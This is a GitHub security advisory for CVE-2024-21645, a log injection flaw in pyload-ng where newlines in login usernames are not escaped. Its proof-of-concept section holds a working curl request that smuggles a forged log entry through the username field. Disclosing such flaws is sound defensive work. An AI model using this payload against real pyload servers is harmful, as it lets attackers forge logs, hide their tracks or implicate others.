# [M] pyload Log Injection vulnerability

## Summary
Severity: Medium
Advisory: GHSA-ghmw-rwh8-6qmr
CVE: CVE-2024-21645
CWE: CWE-74
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2024-01-08
Source: https://github.com/advisories/GHSA-ghmw-rwh8-6qmr
Type: github-advisory

## Affected
- PyPI: `pyload-ng` — affected >=0 <0.5.0b3.dev77

## Details
### Summary
A log injection vulnerability was identified in `pyload`. This vulnerability allows any unauthenticated actor to inject arbitrary messages into the logs gathered by `pyload`.

### Details
`pyload` will generate a log entry when attempting to sign in with faulty credentials. This entry will be in the form of `Login failed for user 'USERNAME'`. However, when supplied with a username containing a newline, this newline is not properly escaped. Newlines are also the delimiter between log entries. This allows the attacker to inject new log entries into the log file.

### PoC
Run `pyload` in the default configuration by running the following command
```
pyload
```

We can now sign in as the pyload user and view the logs at `http://localhost:8000/logs`.
![Viewing the logs](https://user-images.githubusercontent.com/44903767/294433796-f2c96e39-8000-4649-99bb-9c50e786243d.png)

Any unauthenticated attacker can now make the following request to inject arbitrary logs.

```
curl 'http://localhost:8000/login?next=http://localhost:8000/' -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-raw $'do=login&username=wrong\'%0a[2024-01-05 02:49:19]  HACKER               PinkDraconian  THIS ENTRY HAS BEEN INJECTED&password=wrong&submit=Login'
```

If we now were to look at the logs again, we see that the entry has successfully been injected.
![PoC2](https://user-images.githubusercontent.com/44903767/294434785-2fc6dce4-3e2c-4da0-8e80-a6bba882f756.png)

### Impact
Forged or otherwise, corrupted log files can be used to cover an attacker’s tracks or even to implicate another party in the commission of a malicious act.

## References
- https://github.com/pyload/pyload/security/advisories/GHSA-ghmw-rwh8-6qmr
- https://nvd.nist.gov/vuln/detail/CVE-2024-21645
- https://github.com/pyload/pyload/commit/4159a1191ec4fe6d927e57a9c4bb8f54e16c381d
- https://github.com/pyload/pyload
